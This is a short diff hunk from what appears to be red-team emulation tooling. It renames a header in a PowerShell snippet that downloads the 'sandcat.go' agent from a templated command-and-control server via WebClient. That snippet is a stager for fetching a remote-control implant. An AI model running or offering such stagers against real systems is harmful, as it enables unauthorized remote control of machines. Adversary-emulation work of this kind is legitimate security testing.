@@ -11,7 +11,7 @@
           $wc=New-Object System.Net.WebClient;
           $wc.Headers.add("platform","windows");
           $wc.Headers.add("file","sandcat.go");
-          $wc.Headers.add("defaultServer","#{server}");
+          $wc.Headers.add("server","#{server}");
           $wc.Headers.add("defaultSleep","60");
           $wc.Headers.add("defaultGroup","bypassed_u_bro");
           $data=$wc.DownloadData($url);
